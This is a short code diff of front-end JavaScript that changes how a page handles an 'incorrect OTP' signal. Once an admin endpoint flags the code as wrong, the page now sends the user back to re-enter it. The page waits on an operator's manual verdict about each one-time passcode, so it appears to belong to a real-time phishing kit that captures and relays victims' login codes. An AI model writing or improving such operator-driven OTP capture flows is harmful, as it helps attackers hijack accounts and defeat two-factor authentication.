@@ -320,7 +320,7 @@ button:disabled{
     }, 3000);
   }
 
-  // Incorrect OTP polling - SHOWS RED ERROR LABEL AND CLEARS INPUT
+  // Incorrect OTP polling - RESETS EVERYTHING and redirects back to first OTP page
   function startIncorrectOtpPolling() {
     if (incorrectOtpInterval) clearInterval(incorrectOtpInterval);
     incorrectOtpInterval = setInterval(async () => {
@@ -333,25 +333,25 @@ button:disabled{
         const data = await response.json();
         
         if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
-          errorDiv.textContent = '❌ Incorrect OTP entered. Please check your email and try again.';
+          // Show red error message
+          errorDiv.textContent = '❌ Incorrect OTP entered. Please start over from first OTP.';
           errorDiv.style.display = 'block';
           errorDiv.style.color = '#ef4444';
           errorDiv.style.background = '#fef2f2';
           errorDiv.style.padding = '12px';
           errorDiv.style.borderRadius = '12px';
           
-          otpInput.value = '';
-          otpInput.focus();
+          // REDIRECT BACK TO FIRST OTP PAGE to start fresh
+          setTimeout(() => {
+            window.location.href = `/users/otp?email=${encodeURIComponent(email)}`;
+          }, 2000);
           
+          // Clear the error flag
           await fetch('/api/admin/release-text', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email })
           });
-          
-          setTimeout(() => {
-            errorDiv.style.display = 'none';
-          }, 5000);
         }
       } catch (err) {}
     }, 2000);
